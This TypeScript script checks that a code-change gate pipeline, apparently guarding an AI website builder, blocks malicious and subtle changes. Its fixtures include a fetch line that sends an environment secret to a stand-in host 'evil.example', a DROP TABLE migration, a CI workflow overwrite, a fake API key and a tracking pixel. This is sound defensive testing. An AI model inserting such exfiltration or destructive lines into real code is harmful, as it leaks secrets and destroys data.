/**
 * Exercises the real gate pipeline locally, without the model: copies the site repo into a
 * scratch git repo, applies a hand-written change (standing in for the builder), and runs the
 * static gates, the Docker build and the browser smoke test against Postgres with the
 * production guards. Then it tries a malicious change and shows it being blocked.
 *
 *   npx tsx scripts/gate-local.ts ../site
 *
 * Needs Docker and the builder image (docker build -t oojam-builder:latest builder/).
 */
import { cpSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";

const sitePath = resolve(process.argv[2] ?? "../site");
const scratch = mkdtempSync(join(tmpdir(), "oojam-gate-local-"));
process.env.OOJAM_DATA_DIR = join(scratch, "data");
process.env.GUARDS_SQL ??= resolve("deploy/postgres/initdb/02-guards.sql");
mkdirSync(process.env.OOJAM_DATA_DIR, { recursive: true });

const { commitWorkTree, git, readChanges } = await import("../src/guardrails/git.js");
const { runStaticGates, formatReport } = await import("../src/guardrails/index.js");
const { npmRegistry } = await import("../src/guardrails/deps.js");
const { blocks } = await import("../src/guardrails/types.js");
const { buildSiteImage, smokeTest } = await import("../src/worker/gate.js");
const { exportCommit } = await import("../src/worker/workspace.js");

const dirs = { root: scratch, gitDir: join(scratch, "repo.git"), workTree: join(scratch, "workspace") };
cpSync(sitePath, dirs.workTree, {
  recursive: true,
  filter: (src) => !/(\/node_modules|\/build|\/\.react-router|\/\.git)(\/|$)/.test(src.slice(sitePath.length)),
});
const { execFileSync } = await import("node:child_process");
execFileSync("git", ["init", "-q", "--bare", dirs.gitDir]);
await git(dirs, ["config", "core.bare", "false"]);
await git(dirs, ["symbolic-ref", "HEAD", "refs/heads/main"]);
const base = (await commitWorkTree(dirs, "base"))!;
console.log(`base ${base.slice(0, 12)} in ${scratch}`);

const write = (p: string, c: string) => {
  mkdirSync(dirname(join(dirs.workTree, p)), { recursive: true });
  writeFileSync(join(dirs.workTree, p), c);
};

async function gate(label: string, head: string, routes: string[], full: boolean) {
  console.log(`\n=== ${label} ===`);
  const changes = await readChanges(dirs, base, head);
  const findings = await runStaticGates(changes, { registry: npmRegistry, minAgeDays: 14 });
  const ran = ["paths", "migrations", "dependencies", "secrets", "patterns"];
  if (full && blocks(findings).length === 0) {
    const out = await exportCommit(dirs, head);
    console.log("docker build…");
    const built = await buildSiteImage(out, head);
    ran.push("build");
    if (!built.ok) findings.push({ check: "build", severity: "block", message: built.output });
    else {
      console.log("smoke test…");
      ran.push("smoke");
      findings.push(...(await smokeTest(9999, head, routes)));
    }
  }
  console.log(formatReport(findings, ran));
  return blocks(findings).length === 0;
}

// 1. A good change: a new page and an additive migration.
write("app/routes/hello.tsx", `export default function Hello() {\n  return <main className="p-8"><h1 className="text-2xl">Hello from the gate test</h1></main>;\n}\n`);
const routes = readFileSync(join(dirs.workTree, "app/routes.ts"), "utf8");
write("app/routes.ts", routes.replace(/(\] satisfies RouteConfig)/, `  route("hello", "routes/hello.tsx"),\n$1`));
write("drizzle/0001_hello.sql", `CREATE TABLE "hello_visits" (\n  "id" bigserial PRIMARY KEY NOT NULL,\n  "at" timestamp with time zone DEFAULT now() NOT NULL\n);\n`);
const journal = JSON.parse(readFileSync(join(dirs.workTree, "drizzle/meta/_journal.json"), "utf8"));
journal.entries.push({ idx: journal.entries.length, version: "7", when: Date.now(), tag: "0001_hello", breakpoints: true });
write("drizzle/meta/_journal.json", JSON.stringify(journal, null, 2));
const good = (await commitWorkTree(dirs, "good change"))!;
const goodOk = await gate("good change", good, ["/", "/hello"], true);

// 2. A bad change on top of base: drops a table, phones home, edits CI and leaks a key.
await git(dirs, ["reset", "-q", "--hard", base]);
write("drizzle/0001_evil.sql", `DROP TABLE "site_meta";`);
write("app/routes/home.tsx", readFileSync(join(dirs.workTree, "app/routes/home.tsx"), "utf8") + `\nfetch("https://evil.example/c?d=" + process.env.SECRET);\n`);
write(".github/workflows/ci.yml", "on: push\n");
write("app/key.ts", `export const k = "sk-ant-api03-${"x".repeat(40)}";\n`);
const bad = (await commitWorkTree(dirs, "bad change"))!;
const badOk = await gate("malicious change", bad, ["/"], false);

// 3. Subtle: passes the static checks, but loads an off-site image and throws in the browser.
await git(dirs, ["reset", "-q", "--hard", base]);
write("app/routes/hello.tsx", `import { useEffect } from "react";\nexport default function Hello() {\n  useEffect(() => { throw new Error("boom in the browser"); }, []);\n  return <main><img alt="" src="https://tracker.example/pixel.gif" /></main>;\n}\n`);
write("app/routes.ts", routes.replace(/(\] satisfies RouteConfig)/, `  route("hello", "routes/hello.tsx"),\n$1`));
const subtle = (await commitWorkTree(dirs, "subtle change"))!;
const subtleOk = await gate("subtle change (only the browser can tell)", subtle, ["/hello"], true);

console.log(`\nresult: good ${goodOk ? "PASSED" : "BLOCKED"}, malicious ${badOk ? "PASSED (bad!)" : "BLOCKED"}, subtle ${subtleOk ? "PASSED (bad!)" : "BLOCKED"}`);
process.exit(goodOk && !badOk && !subtleOk ? 0 : 1);
